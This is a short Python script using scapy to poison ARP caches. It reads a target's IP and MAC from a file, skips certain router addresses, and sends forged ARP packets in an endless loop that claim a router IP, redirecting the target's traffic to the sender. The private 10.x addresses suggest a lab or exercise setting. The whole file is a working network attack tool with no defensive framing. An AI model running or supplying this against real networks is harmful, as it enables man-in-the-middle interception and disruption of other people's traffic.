from scapy.all import ARP, Ether, sendp

def poison(router_ip, target_ip, target_mac):
    packet = Ether(dst = target_mac)/ARP(op="who-has", psrc=router_ip, pdst=target_ip)
    sendp(packet, inter=0.2, loop=1)

def main():
    with(open("arp_res.txt","r")) as f:
        line = f.readline()
        while line:
            if line.split()[0] != "10.12.0.1" and line.split()[0] != "10.12.0.2":
                ip = line.split()[0]
                mac = line.split()[1]
                break
            line = f.readline()
    router_ips = ["10.12.0.1","10.12.0.2","10.1.0.1"]
    print("Poisoning ARP cache of " + ip + " with MAC " + mac + " and router IP " + router_ips[2] + "...")
    poison(router_ips[2], ip, mac)

if __name__=='__main__':
    main()
